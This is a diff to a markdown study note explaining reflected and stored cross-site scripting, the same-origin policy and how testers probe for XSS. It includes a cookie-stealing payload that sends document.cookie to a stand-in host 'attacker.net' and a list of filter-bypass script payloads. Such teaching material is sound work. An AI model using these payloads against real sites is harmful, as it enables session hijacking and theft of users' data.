@@ -10,4 +10,46 @@ http://www.example.com/error.html?msg=<script>alert(1);</script>
 
 And we say the site is vulnerable to XSS.
 
-An attacker can [exploit this vulnerability](images/reflected-xss.png)
+An attacker can exploit this vulnerability:
+
+<img src="reflected-xss.png" />
+
+Elaborate: the crafted URL can be something like `http://www.example.com/error.html?msg=<script>var+i=new+Image;+i.src="http://attacker.net/"%2bdocument.cookie;</script>`. The attacker monitors for the traffic to his site `attacker.net` and steal the user's cookie on the `example.com` site.
+
+Question: If the attacker can feed the crafted URL to the user, Why doesn’t he simply host a malicious script on `attacker.net` and feed the user a direct link to this script? This is due to the same-origin policy: on the user's browser, different domains don't interfere with each other. If there were something like `document.cookie` in the malicious script, it would return the user's cookie on attacker.net, not `example.com`.
+
+## Stored XSS
+
+Data submitted by user is stored in the application and then is displayed to other users without being filtered or sanitized appropriately.
+
+2 steps:
+- the attacker posts some crafted data containing malicious code that the application stores.
+- a victim views a page containing the attacker’s data, and the malicious code is executed when the script is executed in the victim’s browser.
+
+---
+
+Trust relationships that XSS may exploit:
+- Browsers trust JavaScript received from a website with the cookies issued by that website.
+- If the application employs forms with autocomplete enabled, JavaScript issued by the application can capture any previously entered data that the user’s browser has stored in the autocomplete cache. By instantiating the relevant form, waiting for the browser to autocomplete its contents, and then querying the form field values, the script may be able to steal this data and transmit it to the attacker’s server.
+
+---
+
+Methods to deliver reflected attack:
+- Send a forged email.
+- The attacker creates his own website with content that induce victims to click.
+- Hide the crafted URL in the ads.
+
+---
+
+Finding XSS vulnerabilities: submit a string such as `><script>alert(document.cookie)</script><` as every parameter to every page of the application, and monitor the responses for the appearance of the same string.
+
+If cases are found where the attack string appears unmodified within the response, the application is almost certainly vulnerable to XSS.
+
+To circumvent the application's defensive filters, some of these can be tried:
+```
+“><script >alert(document.cookie)</script >
+“><ScRiPt>alert(document.cookie)</ScRiPt>
+“%3e%3cscript%3ealert(document.cookie)%3c/script%3e
+“><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%00“><script>alert(document.cookie)</script>
+```
